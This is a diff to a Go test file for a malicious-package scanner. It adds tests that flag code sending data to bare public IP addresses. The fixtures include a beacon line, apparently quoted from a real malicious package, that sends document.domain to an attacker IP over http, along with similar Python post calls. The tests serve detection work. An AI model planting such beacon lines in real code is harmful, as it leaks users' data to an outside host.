@@ -69,8 +69,10 @@ func TestScan_ReputationHost(t *testing.T) {
 	})
 
 	t.Run("IP feed host + send -> reputation_host", func(t *testing.T) {
+		// https: an http:// public IP literal that sends is exfil_host now
+		// (TestScan_PublicIPv4C2), so this exercises the feed's IP equality.
 		fs := files(map[string]string{
-			"pkg/x.py": "import requests\nrequests.post('http://54.254.189.27/api/v1/file/upload', data=b'x')\n",
+			"pkg/x.py": "import requests\nrequests.post('https://54.254.189.27/api/v1/file/upload', data=b'x')\n",
 		})
 		r := Scan(fs)
 		if !r.Detected {
@@ -351,5 +353,49 @@ func TestExfilHostCoupled(t *testing.T) {
 				t.Fatalf("Coupled = %v, want %v (%s)", r.Coupled, tc.want, r.Detail)
 			}
 		})
+	}
+}
+
+// TestScan_PublicIPv4C2 pins the bare-IP beacon: helpersutils-dev-tools
+// (2026-09) sent document.domain to http://5.189.173.113:8899/csp-edu on
+// require. A public IPv4 literal behind http:// in shipping code that also
+// sends is an exfil_host hit; private, loopback, link-local, CGNAT and the
+// well-known resolvers are not, and neither is a test, docs or no-send file.
+func TestScan_PublicIPv4C2(t *testing.T) {
+	beacon := "fetch('http://5.189.173.113:8899/csp-edu?d=' + document.domain)\n"
+	for name, fs := range map[string]map[string]string{
+		"js beacon on require": {"package/index.js": beacon},
+		"python post":          {"pkg/__init__.py": "import requests\nrequests.post('http://45.61.1.2/u', data=b'x')\n"},
+		"node http.get":        {"package/lib.js": "const http = require('http');\nhttp.get(\"http://45.61.1.2:80\")\n"},
+	} {
+		r := Scan(files(fs))
+		if !r.Detected || r.Kind != "exfil_host" || !r.Coupled || r.Weak {
+			t.Errorf("%s: want coupled exfil_host, got %+v", name, r)
+		}
+	}
+	if r := Scan(files(map[string]string{"package/index.js": beacon})); r.Detail != "package/index.js: http://5.189.173.113" {
+		t.Errorf("detail should name the file and IP: %q", r.Detail)
+	}
+	for name, fs := range map[string]map[string]string{
+		"test fixture":       {"package/test/fixtures.js": beacon},
+		"docs":               {"package/docs/usage.md": beacon},
+		"no send":            {"package/index.js": "const u = 'http://5.189.173.113:8899/csp-edu'\n"},
+		"LAN SDK":            {"pkg/router.py": "import requests\nrequests.get('http://192.168.1.1/api')\n"},
+		"rfc1918 10/8":       {"pkg/a.py": "requests.get('http://10.0.0.5:8080/')\n"},
+		"rfc1918 172.16/12":  {"pkg/a.py": "requests.get('http://172.20.0.1/')\n"},
+		"loopback":           {"package/dev.js": "fetch('http://127.0.0.1:3000/')\n"},
+		"cloud metadata":     {"pkg/aws.py": "requests.get('http://169.254.169.254/latest/meta-data/')\n"},
+		"cgnat":              {"pkg/a.py": "requests.get('http://100.64.0.1/')\n"},
+		"zero net":           {"package/a.js": "fetch('http://0.0.0.0:8080/')\n"},
+		"google dns":         {"package/a.js": "fetch('http://8.8.8.8/')\n"},
+		"cloudflare dns":     {"package/a.js": "fetch('http://1.1.1.1/')\n"},
+		"quad9":              {"package/a.js": "fetch('http://9.9.9.9/')\n"},
+		"ip-shaped hostname": {"package/a.js": "fetch('http://5.189.173.113.nip.io/')\n"},
+		"https is not this":  {"package/a.js": "fetch('https://5.189.173.113/')\n"},
+		"not an address":     {"package/a.js": "fetch('http://999.1.1.1/')\n"},
+	} {
+		if r := Scan(files(fs)); r.Detected {
+			t.Errorf("%s: want clean, got %+v", name, r)
+		}
 	}
 }
